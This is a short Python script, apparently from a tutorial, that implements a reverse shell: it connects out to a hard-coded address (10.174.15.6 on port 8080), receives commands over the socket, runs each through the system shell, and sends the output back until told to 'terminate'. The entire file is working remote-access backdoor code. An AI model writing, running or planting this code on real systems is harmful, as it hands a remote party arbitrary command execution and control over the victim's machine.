import socket
import subprocess # See video https://www.youtube.com/watch?v=2Fp1N6dof0Y

def connect():
    s = socket.socket()
    s.connect(("10.174.15.6",8080))
    while True:
        command = s.recv(1024)
        if "terminate" in command.decode():
            s.close()
            break
        else:
            # See the video above which explains how the subprocess element works
            # A pipe has two endpoints
            CMD = subprocess.Popen(command.decode(), shell = True, stdout = subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send(CMD.stdout.read())
            s.send(CMD.stderr.read())

def main():
    connect()
main()
    